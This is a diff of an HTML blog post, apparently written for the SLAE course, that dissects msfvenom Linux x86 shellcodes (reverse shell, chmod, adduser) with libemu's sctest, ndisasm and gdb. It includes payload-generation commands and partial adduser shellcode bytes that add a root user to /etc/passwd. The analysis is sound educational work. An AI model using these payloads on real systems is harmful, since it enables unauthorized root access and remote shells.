@@ -69,15 +69,15 @@
 <p>To generate payloads I will use Metasploit Framework (MSF). And, instead of the used in the past and recently phased out <code>msfpayload</code> tool, I will use its better replacement - <code>msfvenom</code>.</p>
 <h1>Installation of libemu</h1>
 <p>When I was installing <code>libemu</code>, I expected to find it in Kali repositories, but alas it wasn't there. After googling a bit, I found that most of the links led to <a href="http://libemu.carnivore.it">libemu.carnivore.it</a> page, which was down at the time of this writing. So I had to find and fork its source code elsewhere on the GitHub. After getting my hands on its source code I followed this <a href="http://blog.xanda.org/2012/05/16/installation-of-libemu-and-pylibemu-on-ubuntu/">guide on libemu installation</a> and successfully installed it on my system:</p>
-<div class="highlight"><pre><span class="c"># The only dependency I had to satisfy on my Kali machine</span>
+<div class="highlight"><pre><span></span><span class="c1"># The only dependency I had to satisfy on my Kali machine</span>
 apt-get install libtool
 <span class="nb">cd</span> ~/Downloads
 
-<span class="c"># Cloning the source code from my GitHub repo</span>
+<span class="c1"># Cloning the source code from my GitHub repo</span>
 git clone --depth<span class="o">=</span><span class="m">1</span> https://github.com/reider-roque/libemu
-<span class="nb">cd </span>libemu
+<span class="nb">cd</span> libemu
 
-<span class="c"># Building and installing libemu</span>
+<span class="c1"># Building and installing libemu</span>
 autoreconf -i -v
 ./configure --prefix<span class="o">=</span>/opt/libemu
 make install
@@ -86,12 +86,12 @@ make install
 
 <h1>Example #1: Reverse shell</h1>
 <p>With the following command we will first see what Linux x86 payloads are available:</p>
-<div class="highlight"><pre>msfvenom --list payloads <span class="p">|</span> grep linux/x86
+<div class="highlight"><pre><span></span>msfvenom --list payloads <span class="p">|</span> grep linux/x86
 </pre></div>
 
 
 <p>Output (truncated):</p>
-<div class="highlight"><pre>linux/x86/adduser       Create a new user with UID 0
+<div class="highlight"><pre><span></span>linux/x86/adduser       Create a new user with UID 0
 linux/x86/chmod         Runs chmod on specified file with specified mode
 linux/x86/exec          Execute an arbitrary command
 linux/x86/meterpreter/bind_ipv6_tcp   
@@ -108,12 +108,12 @@ Inject the meterpreter server payload (staged). Listen for a connection (Linux x
 
 <p>As you can see, most of the available payloads are for spawning either reverse or bind shells. By the way, here is the reason the shellcode is called so: shellcode is a sequence of assembly instructions that is most often used in exploits to spawn an (administrative) shell.</p>
 <p>For the first example I will take and dissect the reverse shell payload. Let's first see if there are mandatory options for this payload (output is truncated for brevity):</p>
-<div class="highlight"><pre>msfvenom -p linux/x86/shell_reverse_tcp --payload-options
+<div class="highlight"><pre><span></span>msfvenom -p linux/x86/shell_reverse_tcp --payload-options
 </pre></div>
 
 
 <p>Output:</p>
-<div class="highlight"><pre>Options for payload/linux/x86/shell_reverse_tcp:
+<div class="highlight"><pre><span></span>Options for payload/linux/x86/shell_reverse_tcp:
 ...
 Basic options:
 Name   Current Setting  Required  Description
@@ -126,15 +126,15 @@ LPORT  4444             yes       The listen port
 
 <p>From the output above we can see that there are two required options, with one of them not having any default value. So for proper work of the payload we can leave <code>LPORT</code> at its default value, but we'll need to supply the <code>LHOST</code>.</p>
 <p>Below I will pipe the generated payload into the <code>sctest</code>, binary that comes with <code>libemu</code> framework, which will analyze the code and try to generate a high level structure of the shellcode:</p>
-<div class="highlight"><pre>msfvenom -p linux/x86/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>127.1.1.1 -f raw <span class="p">|</span> /opt/libemu/bin/sctest -vvv -S -s <span class="m">100000</span> -G tmp.dot
+<div class="highlight"><pre><span></span>msfvenom -p linux/x86/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">127</span>.1.1.1 -f raw <span class="p">|</span> /opt/libemu/bin/sctest -vvv -S -s <span class="m">100000</span> -G tmp.dot
 </pre></div>
 
 
 <p>The <code>-vvv</code> option to <code>sctest</code> increases verbosity. The <code>-S</code> is for reading input from stdin. The <code>-s</code> option controls the maximum number of instructions to execute and defaults to 1, which means <code>sctest</code> will emulate execution of only the first instruction of the supplied shellcode. To be on the safe side and make sure that every shellcode instruction is executed, it is usually set to some big number, like 100000.</p>
-<p><img alt="Top of the sctest output" src="http://www.wryway.com/blog/dissecting-msfvenom-shellcodes/sctest-top-output.png" title="Top of the sctest output" />
+<p><img alt="Top of the sctest output" src="http://www.wryway.com/blog/dissecting-msfvenom-shellcodes/sctest-top-output.png" title="Top of the sctest output">
 <div class="img-caption">Top of the sctest output</div></p>
 <p>At the top of the output you can see how <code>sctest</code> tears down the shellcode instruction by instruction and shows you the state of registers after execution of each instruction. At the bottom of the output you will find the reconstructed high level view of what's going on:</p>
-<div class="highlight"><pre><span class="kt">int</span> <span class="n">socket</span> <span class="p">(</span>
+<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="n">socket</span> <span class="p">(</span>
      <span class="kt">int</span> <span class="n">domain</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
      <span class="kt">int</span> <span class="n">type</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
      <span class="kt">int</span> <span class="n">protocol</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
@@ -185,13 +185,13 @@ LPORT  4444             yes       The listen port
 <p>As you can see using <code>sctest</code> we were able to understand what the shellcode does without even disassembling it. But this is not always the case. Let's take a look at the next example.</p>
 <h1>Example #2: Chmod</h1>
 <p>As in the previous example, I will pipe the generated shellcode into <code>sctest</code>. This time it will be the chmod payload. All it does is modify Unix permissions on a file to, by default, 0666.</p>
-<div class="highlight"><pre>msfvenom -p linux/x86/chmod <span class="nv">FILE</span><span class="o">=</span>tmp.bin -f raw <span class="p">|</span> /opt/libemu/bin/sctest -vvv -S -s <span class="m">100000</span> -G tmp.dot
+<div class="highlight"><pre><span></span>msfvenom -p linux/x86/chmod <span class="nv">FILE</span><span class="o">=</span>tmp.bin -f raw <span class="p">|</span> /opt/libemu/bin/sctest -vvv -S -s <span class="m">100000</span> -G tmp.dot
 </pre></div>
 
 
 <p>The <code>-G</code> option supplied to the sctest command outputs a graph of shellcode logic in the dot file format, that can be further converted into an image using <code>dot</code> utility. Looking at the depicted algorithm sometimes facilitates a better understanding of what's happening, especially when the shellcode extensively uses loops and branching.</p>
 <p>After running the above command the high level output I got was this:</p>
-<div class="highlight"><pre><span class="n">ERROR</span>  <span class="n">chmod</span> <span class="p">(</span>
+<div class="highlight"><pre><span></span><span class="n">ERROR</span>  <span class="nf">chmod</span> <span class="p">(</span>
 <span class="p">)</span> <span class="o">=</span>  <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
 <span class="n">ERROR</span>  <span class="n">exit</span> <span class="p">(</span>
      <span class="kt">int</span> <span class="n">status</span> <span class="o">=</span> <span class="mi">4288522</span><span class="p">;</span>
@@ -200,14 +200,14 @@ LPORT  4444             yes       The listen port
 
 
 <p>Looking at it I could tell that the shellcode probably called the <code>chmod()</code> and <code>exit()</code> functions, but what parameters were passed to <code>chmod()</code> was not clear. Let's take a look at the graph converted from dot to png file format:</p>
-<div class="highlight"><pre>dot -Tpng -o tmp.png tmp.dot <span class="o">&amp;&amp;</span> eog tmp.png
+<div class="highlight"><pre><span></span>dot -Tpng -o tmp.png tmp.dot <span class="o">&amp;&amp;</span> eog tmp.png
 </pre></div>
 
 
-<p><img alt="Chmod shellcode call graph" src="http://www.wryway.com/blog/dissecting-msfvenom-shellcodes/chmod-shellcode-call-graph.png" title="Chmod shellcode call graph" />
+<p><img alt="Chmod shellcode call graph" src="http://www.wryway.com/blog/dissecting-msfvenom-shellcodes/chmod-shellcode-call-graph.png" title="Chmod shellcode call graph">
 <div class="img-caption">Chmod shellcode call graph</div></p>
 <p>On the call graph we can again see that <code>sctest</code> definitely caught calls to the <code>chmod()</code> and <code>exit()</code> functions. We can also see that the second argument (ECX register) to the <code>chmod</code> system call is set to <em>0x1b6</em>, which, as we can confirm on Linux command line with </p>
-<div class="highlight"><pre><span class="nb">printf</span> <span class="s2">&quot;%o\n&quot;</span> 0x1b6 
+<div class="highlight"><pre><span></span><span class="nb">printf</span> <span class="s2">&quot;%o\n&quot;</span> 0x1b6 
 </pre></div>
 
 
@@ -217,17 +217,17 @@ LPORT  4444             yes       The listen port
 <h1>Example #3: Adduser</h1>
 <p>In this example I want to zero in on the case where the <code>sctest</code> is mostly useless and some interaction with <code>gdb</code> is needed to fully see the shellcode through.</p>
 <p>After running the following command, you will see that <code>sctest</code> was not able to generate a high view of the shellcode logic and even the tmp.dot call graph is empty:</p>
-<div class="highlight"><pre>msfvenom -p linux/x86/adduser -f raw <span class="p">|</span> /opt/libemu/bin/sctest -vvv -S -s <span class="m">100000</span> -G tmp.dot
+<div class="highlight"><pre><span></span>msfvenom -p linux/x86/adduser -f raw <span class="p">|</span> /opt/libemu/bin/sctest -vvv -S -s <span class="m">100000</span> -G tmp.dot
 </pre></div>
 
 
 <p>Let's try a different approach and disassemble the shellcode with <code>ndisasm</code>:</p>
-<div class="highlight"><pre>msfvenom -p linux/x86/adduser -f raw &gt; tmp.bin <span class="o">&amp;&amp;</span> ndisasm -b32 tmp.bin
+<div class="highlight"><pre><span></span>msfvenom -p linux/x86/adduser -f raw &gt; tmp.bin <span class="o">&amp;&amp;</span> ndisasm -b32 tmp.bin
 </pre></div>
 
 
 <p>Below is the output of the above command with my comments. I truncated the "gibberish" part to save some space.</p>
-<div class="highlight"><pre><span class="err">00000000</span>  <span class="err">31</span><span class="nf">C9</span>              <span class="nv">xor</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">ecx</span> <span class="err">#</span> <span class="nv">zero</span> <span class="nv">out</span> <span class="nb">ECX</span> <span class="nv">and</span> <span class="nb">EBX</span>
+<div class="highlight"><pre><span></span><span class="err">00000000</span>  <span class="err">31</span><span class="nf">C9</span>              <span class="nv">xor</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">ecx</span> <span class="err">#</span> <span class="nv">zero</span> <span class="nv">out</span> <span class="nb">ECX</span> <span class="nv">and</span> <span class="nb">EBX</span>
 <span class="err">00000002</span>  <span class="err">89</span><span class="nf">CB</span>              <span class="nv">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">ecx</span>
 <span class="err">00000004</span>  <span class="err">6</span><span class="nf">A46</span>              <span class="nv">push</span> <span class="kt">byte</span> <span class="o">+</span><span class="mh">0x46</span> <span class="err">#</span> <span class="nv">load</span> <span class="nb">EAX</span> <span class="nv">with</span> <span class="mh">0x46</span><span class="p">,</span> <span class="nv">corresponding</span>
 <span class="err">00000006</span>  <span class="err">58</span>                <span class="nf">pop</span> <span class="nb">eax</span>     <span class="err">#</span> <span class="nv">to</span> <span class="nv">setreuid</span> <span class="nv">syscall</span> <span class="err">#</span>
@@ -273,12 +273,12 @@ LPORT  4444             yes       The listen port
 <p>Now, the interesting part. Note that the call instruction jumps to the 0x53 address. But then there are no separate instructions at that address. There is an instruction at the address 0x52 and then at 0x55. This fact indicates that in the "gibberish" part of the code some incorrect sequence of bytes confused the disassembler and the bytes-to-opcodes translation went off. </p>
 <p>Note the sequence of bytes at the 0x52 address - 0A598B. The 53rd byte, where the <code>call</code> instruction jumps is 59. I will regenerate payload in the C format, take the part starting from 53rd byte, and disassemble it to get the correct bytes-to-opcodes translation. For that I will use the <a href="https://github.com/reider-roque/reed/tree/master/tools">scdisas</a> script, which I created while going through the SLAE course materials.</p>
 <p>Producing shellcode in the format ready to be pasted into a C program:</p>
-<div class="highlight"><pre>msfvenom -p linux/x86/adduser -f c
+<div class="highlight"><pre><span></span>msfvenom -p linux/x86/adduser -f c
 </pre></div>
 
 
 <p>Output (truncated):</p>
-<div class="highlight"><pre>...
+<div class="highlight"><pre><span></span>...
 &quot;\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51&quot;
 &quot;\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63&quot;
 &quot;\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x28\x00\x00\x00\x6d\x65&quot;
@@ -290,12 +290,12 @@ LPORT  4444             yes       The listen port
 
 
 <p>Disassembling of the shellcode starting from 52nd byte:</p>
-<div class="highlight"><pre>scdisas <span class="s2">&quot;\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80&quot;</span>
+<div class="highlight"><pre><span></span>scdisas <span class="s2">&quot;\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80&quot;</span>
 </pre></div>
 
 
 <p>Output:</p>
-<div class="highlight"><pre>00000000  59                pop ecx
+<div class="highlight"><pre><span></span>00000000  59                pop ecx
 00000001  8B51FC            mov edx,[ecx-0x4]
 00000004  6A04              push byte +0x4
 00000006  58                pop eax
@@ -308,36 +308,36 @@ LPORT  4444             yes       The listen port
 
 <p>In the above output you can see that the instruction where call passes execution flow is a pop instruction. That means that the shellcode employed the variation of jmp-call-pop technique, as encountered in the previous example. So, what I called "gibberish" is actually some kind of data, most likely a string, address to which gets loaded into ECX register. By now we already know what string it is, but just to make sure, let's take a look at it in <code>gdb</code>.</p>
 <p>To run the shellcode in <code>gdb</code> I'll save it in the ELF format. The ELF format that <code>msfvenom</code> outputs runs without any problems, but the binary is stripped of all symbols, which means that we won't be able to set a breakpoint on the <em>_start</em> or <em>main</em> labels. To find the entry point we can use the <code>readelf</code> utility. One of the lines from its output will point us to the address in question:</p>
-<div class="highlight"><pre>msfvenom -p linux/x86/adduser -f elf &gt; tmp.elf
+<div class="highlight"><pre><span></span>msfvenom -p linux/x86/adduser -f elf &gt; tmp.elf
 chmod +x tmp.elf
 readelf --headers tmp.elf
 </pre></div>
 
 
 <p>Output:</p>
-<div class="highlight"><pre>...
+<div class="highlight"><pre><span></span>...
   Entry point address:               0x8048054
 ...
 </pre></div>
 
 
 <p>Below is the command sequence that gets us started with gdb:</p>
-<div class="highlight"><pre>gdb tmp.elf
+<div class="highlight"><pre><span></span>gdb tmp.elf
 <span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x8048054
 <span class="o">(</span>gdb<span class="o">)</span> run
 <span class="o">(</span>gdb<span class="o">)</span> disas <span class="nv">$eip</span>,+45
 </pre></div>
 
 
-<p><img alt="Disassembly view in gdb" src="http://www.wryway.com/blog/dissecting-msfvenom-shellcodes/disassembly-view-in-gdb.png" title="Disassembly view in gdb" />
+<p><img alt="Disassembly view in gdb" src="http://www.wryway.com/blog/dissecting-msfvenom-shellcodes/disassembly-view-in-gdb.png" title="Disassembly view in gdb">
 <div class="img-caption">Disassembly view in gdb</div></p>
 <p>On the above picture you can see that the data starts at the address following the <code>call</code> instruction which is 0x0804807f. And running either of the following two commands, we can be certain that the 40 bytes of the data represent the string that as we saw earlier written to the <code>/etc/passwd</code> file:</p>
-<div class="highlight"><pre><span class="o">(</span>gdb<span class="o">)</span> x/40cb 0x0804807f
+<div class="highlight"><pre><span></span><span class="o">(</span>gdb<span class="o">)</span> x/40cb 0x0804807f
 <span class="o">(</span>gdb<span class="o">)</span> x/s 0x0804807f
 </pre></div>
 
 
-<p><img alt="Checking string data in gdb" src="http://www.wryway.com/blog/dissecting-msfvenom-shellcodes/checking-string-data-in-gdb.png" title="Checking string data in gdb" />
+<p><img alt="Checking string data in gdb" src="http://www.wryway.com/blog/dissecting-msfvenom-shellcodes/checking-string-data-in-gdb.png" title="Checking string data in gdb">
 <div class="img-caption">Checking string data in gdb</div></p>
 <div class="divider"></div>
 
@@ -394,7 +394,7 @@ This blog post was created to fulfill the requirements of the <a href="http://se
     </ul>
 
     <p class="disclaimer">
-    Oleg Mitrofanov &copy; 2015-2016.
+    Oleg Mitrofanov &copy; 2015-2017.
     Built with <a href="http://getpelican.com">Pelican</a>, and <a href="https://github.com/hdra/Pelican-Cid">Cid</a> theme.
     </p>
 </footer>
